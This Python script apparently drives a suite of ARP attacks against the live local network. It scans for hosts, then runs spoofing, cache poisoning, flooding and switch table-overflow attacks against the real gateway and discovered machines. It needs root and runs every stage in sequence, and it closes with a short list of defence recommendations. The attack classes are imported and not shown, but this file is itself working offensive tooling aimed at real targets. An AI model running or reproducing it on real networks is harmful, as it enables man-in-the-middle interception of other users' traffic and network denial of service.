import logging
import sys
import time

import netifaces

from attack.leyer_2.arp import NetworkDiscovery, ARPInspection, AdvancedARPSpoofing, ARPCachePoisoning, ARPFlooding, \
    ARPTableOverflow
from discover import os
from os import geteuid
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('arp_attacks.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('ARP_Attacks')

class ARPAttackDemo:
    """Professional ARP Attack Demonstration - FIXED"""

    def __init__(self, iface: str = "en0"):
        self.iface = iface
        self.results = {}
        self.network_info = NetworkDiscovery.get_network_info(iface)

    def run_comprehensive_demo(self):
        """Run comprehensive ARP attack demonstration - FIXED THREADING"""
        logger.info("🚀 STARTING COMPREHENSIVE ARP ATTACK DEMONSTRATION")

        # Display network information
        logger.info(f"📡 Network Information:")
        logger.info(f"   Interface: {self.network_info.get('interface', 'N/A')}")
        logger.info(f"   IP Address: {self.network_info.get('ip_address', 'N/A')}")
        logger.info(f"   Network: {self.network_info.get('network_cidr', 'N/A')}")
        logger.info(f"   Gateway: {self.network_info.get('gateway', 'N/A')}")
        logger.info(f"   Total Hosts: {self.network_info.get('total_hosts', 'N/A')}")

        try:
            # 1. ARP Scanning (Improved with longer timeout)
            self._demo_arp_scanning()

            # 2. ARP Spoofing Techniques (Fixed threading)
            self._demo_arp_spoofing()

            # 3. Cache Poisoning
            self._demo_cache_poisoning()

            # 4. ARP Flooding
            self._demo_arp_flooding()

            # 5. Table Overflow
            self._demo_table_overflow()

            # 6. ARP Inspection
            self._demo_arp_inspection()

            self._print_demo_summary()

        except KeyboardInterrupt:
            logger.info("Demo interrupted by user")
        except Exception as e:
            logger.error(f"Demo error: {e}")
        finally:
            logger.info("Demo completed")

    def _demo_arp_scanning(self):
        """Demonstrate ARP scanning - IMPROVED with longer timeout"""
        logger.info("\n" + "=" * 60)
        logger.info("1. 🔍 ARP NETWORK SCANNING")
        logger.info("=" * 60)

        scanner = ARPInspection(self.iface, verbose=True)

        # Use actual network from discovery
        network = self.network_info.get('network_cidr', '192.168.1.0/24')

        # Active scanning first with longer timeout
        logger.info("Performing active ARP scan (30 seconds timeout)...")
        active_hosts = scanner.arp_scan_network(network, timeout=30)

        # Then passive monitoring
        logger.info("Performing passive ARP monitoring (20 seconds)...")
        passive_result = scanner.start_arp_inspection(duration=20)

        # Combine results
        combined_hosts = {**active_hosts, **passive_result['hosts']}
        self.results['scanning'] = {
            'hosts_discovered': len(combined_hosts),
            'active_scan': len(active_hosts),
            'passive_scan': len(passive_result['hosts']),
            'total_hosts': len(combined_hosts),
            'hosts_list': combined_hosts
        }

        logger.info(f"Scanning completed: {len(combined_hosts)} total hosts found")
        if combined_hosts:
            logger.info("Discovered hosts:")
            for ip, mac in combined_hosts.items():
                logger.info(f"  {ip} -> {mac}")

    def _demo_arp_spoofing(self):
        """Demonstrate ARP spoofing techniques - FIXED THREADING"""
        logger.info("\n" + "=" * 60)
        logger.info("2. 🎭 ADVANCED ARP SPOOFING TECHNIQUES")
        logger.info("=" * 60)

        # Use real gateway and a discovered target if available
        gateway = self.network_info.get('gateway', '192.168.0.1')

        # Use a discovered host or fallback to hypothetical
        target_ip = None
        if 'scanning' in self.results and self.results['scanning']['hosts_list']:
            hosts = self.results['scanning']['hosts_list']
            # Find a host that's not the gateway
            for ip in hosts:
                if ip != gateway:
                    target_ip = ip
                    break

        if not target_ip:
            target_ip = "192.168.0.100"  # Fallback

        techniques = ["bidirectional", "aggressive"]

        for technique in techniques:
            logger.info(f"Testing {technique} spoofing: {target_ip} <-> {gateway}")
            spoofer = AdvancedARPSpoofing(self.iface, verbose=True)
            result = spoofer.start_advanced_spoofing(
                target_ip, gateway, technique, duration=4
            )

            time.sleep(5)  # Let it run
            spoofer.stop_spoofing()  # Stop and cleanup
            time.sleep(1)  # Brief pause between techniques

        self.results['spoofing'] = {'packets_sent': 'varies_by_technique'}

    def _demo_cache_poisoning(self):
        """Demonstrate ARP cache poisoning"""
        logger.info("\n" + "=" * 60)
        logger.info("3. 🧪 ARP CACHE POISONING")
        logger.info("=" * 60)

        poisoner = ARPCachePoisoning(self.iface, verbose=True)

        # Use real targets from scanning if available
        if 'scanning' in self.results and self.results['scanning']['hosts_list']:
            targets = list(self.results['scanning']['hosts_list'].keys())[:2]  # Use first 2 discovered hosts
        else:
            targets = ["192.168.0.100", "192.168.0.101"]

        spoofed_ips = [self.network_info.get('gateway', '192.168.0.1'), "192.168.0.254"]

        poisoner.add_targets(targets)
        result = poisoner.start_cache_poisoning(spoofed_ips, duration=4)

        time.sleep(5)
        poisoner.stop_cache_poisoning()

        self.results['cache_poisoning'] = poisoner.stats

    def _demo_arp_flooding(self):
        """Demonstrate ARP flooding attacks"""
        logger.info("\n" + "=" * 60)
        logger.info("4. 🌊 ARP FLOODING ATTACKS")
        logger.info("=" * 60)

        flooder = ARPFlooding(self.iface, verbose=True)

        flood_types = ["requests", "mixed"]

        for flood_type in flood_types:
            logger.info(f"Testing {flood_type} flooding...")
            result = flooder.start_arp_flood(
                target_ip="192.168.0.100",
                flood_type=flood_type,
                packet_rate=30,  # Reduced for stability
                duration=3
            )
            time.sleep(4)
            flooder.stop_arp_flood()

        self.results['flooding'] = flooder.stats

    def _demo_table_overflow(self):
        """Demonstrate ARP table overflow"""
        logger.info("\n" + "=" * 60)
        logger.info("5. 💥 ARP TABLE OVERFLOW ATTACK")
        logger.info("=" * 60)

        overflow = ARPTableOverflow(self.iface, verbose=True)
        result = overflow.start_table_overflow(duration=4)

        time.sleep(5)
        overflow.stop_table_overflow()

        self.results['table_overflow'] = overflow.stats

    def _demo_arp_inspection(self):
        """Demonstrate ARP traffic inspection"""
        logger.info("\n" + "=" * 60)
        logger.info("6. 🔎 ARP TRAFFIC INSPECTION")
        logger.info("=" * 60)

        inspector = ARPInspection(self.iface, verbose=True)
        inspection_result = inspector.start_arp_inspection(duration=30)

        self.results['inspection'] = inspection_result

    def _print_demo_summary(self):
        """Print comprehensive demo summary"""
        logger.info("\n" + "=" * 60)
        logger.info("🎯 ARP ATTACK DEMONSTRATION SUMMARY")
        logger.info("=" * 60)

        for attack_name, result in self.results.items():
            if isinstance(result, dict):
                if attack_name == 'scanning':
                    hosts = result.get('total_hosts', 'N/A')
                    logger.info(f"✅ {attack_name.upper():<20} | Hosts: {hosts}")
                elif 'packets_sent' in result:
                    packets = result.get('packets_sent', 0)
                    logger.info(f"✅ {attack_name.upper():<20} | Packets: {packets:>6}")

        logger.info("\n📊 ATTACK EFFECTIVENESS:")
        logger.info("  • ARP Spoofing    - High (MitM attacks)")
        logger.info("  • Cache Poisoning - High (redirect traffic)")
        logger.info("  • ARP Flooding    - Medium (network disruption)")
        logger.info("  • Table Overflow  - High (switch DoS)")
        logger.info("  • ARP Inspection  - Defensive (detection)")

        logger.info("\n🛡️  DEFENSE RECOMMENDATIONS:")
        logger.info("  • Implement Dynamic ARP Inspection (DAI)")
        logger.info("  • Use static ARP entries for critical hosts")
        logger.info("  • Enable port security on switches")
        logger.info("  • Monitor ARP traffic for anomalies")
        logger.info("  • Use ARP spoofing detection tools")


def main():
    """Main execution function"""
    system = sys.platform

    # Auto-detect interface
    try:
        gateways = netifaces.gateways()
        default_interface = gateways['default'][netifaces.AF_INET][1]
        iface = default_interface
    except:
        iface = "en0" if system == 'Darwin' else "eth0"

    # Check permissions
    if geteuid() != 0:
        print("❌ This tool requires root privileges. Run with sudo.")
        sys.exit(1)

    try:
        demo = ARPAttackDemo(iface)
        demo.run_comprehensive_demo()
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()